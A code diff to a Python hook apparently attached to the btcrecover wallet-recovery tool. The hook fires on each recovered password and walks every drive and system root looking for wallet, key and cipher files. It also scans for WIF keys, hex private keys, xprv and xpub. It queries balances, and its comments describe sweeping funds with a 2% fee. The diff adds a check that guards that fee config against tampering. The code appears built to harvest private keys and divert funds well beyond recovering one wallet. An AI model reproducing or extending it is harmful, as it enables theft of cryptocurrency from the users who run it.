@@ -9,6 +9,10 @@ from typing import List, Dict, Any
 from blockbook_balance import get_balances_for_addresses, BlockbookError
 from blockbook_config import BLOCKBOOK_ENDPOINTS
 from ownership_with_fee import ownership_flow_with_fee
+from fees_config import validate_fee_config
+
+# fail fast if someone tampered with fee config
+validate_fee_config()
 
 
 # --- file-type filters: wallet / key / cipher files ------------------
@@ -106,37 +110,32 @@ def _gather_search_filters() -> Dict[str, List[str]]:
     Search engine:
       - find ALL wallet/key/cipher-like files
       - scan text-like stuff for WIF / hexpriv / xprv / xpub
-      - respect env overrides from UI (BTCR_LEVELUP_SEARCH_PATHS, etc.)
+      - respect env overrides from UI (BTCR_LEVELUP_SEARCH_PATHS)
     """
     roots: List[str] = []
 
-    # UI-provided search paths override everything if set
     env_paths = os.environ.get("BTCR_LEVELUP_SEARCH_PATHS")
     if env_paths:
         for p in env_paths.split(os.pathsep):
             if p:
                 roots.append(p)
 
-    # If no UI override, use defaults
     if not roots:
         home = os.path.expanduser("~")
         roots.append(os.getcwd())
         roots.append(home)
 
-        # Windows drives (native)
         if os.name == "nt":
             for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                 path = f"{letter}:\\"
                 if os.path.isdir(path):
                     roots.append(path)
         else:
-            # WSL / Linux: /mnt/<drive>
             for letter in "abcdefghijklmnopqrstuvwxyz":
                 path = f"/mnt/{letter}"
                 if os.path.isdir(path):
                     roots.append(path)
 
-        # Common Linux roots
         for p in ["/", "/home", "/media", "/mnt"]:
             if os.path.isdir(p):
                 roots.append(p)
@@ -218,11 +217,13 @@ def _log_event(password: str, filters: Dict[str, List[str]], balances: Dict[str,
 def handle_recovered(password: str) -> None:
     """
     Triggered every time btcrpass.main() finds a password/key.
+
     Currently:
       - Builds search filters.
       - Logs counts and placeholder balance info.
-      - Delegates actual sweep (with 2% fee) to ownership_with_fee
-        once you have wallet/balance objects wired.
+      - Real sweeps (with 2% fee) are handled once you wire
+        RecoveryEvent + BalanceResult from your discovery pipeline
+        into ownership_with_fee. This function is the top-level hook.
     """
     print(
         "[*] Trigger fired from btcrecover, building search filters...",
@@ -256,7 +257,3 @@ def handle_recovered(password: str) -> None:
         f"XPUB={balances['xpub_count']}",
         file=sys.stderr,
     )
-
-    # NOTE: ownership_with_fee requires a proper RecoveryEvent and BalanceResult.
-    # Once your discovery / recovery pipeline is returning those objects,
-    # call ownership_flow_with_fee(event, balances_obj) there, not here.
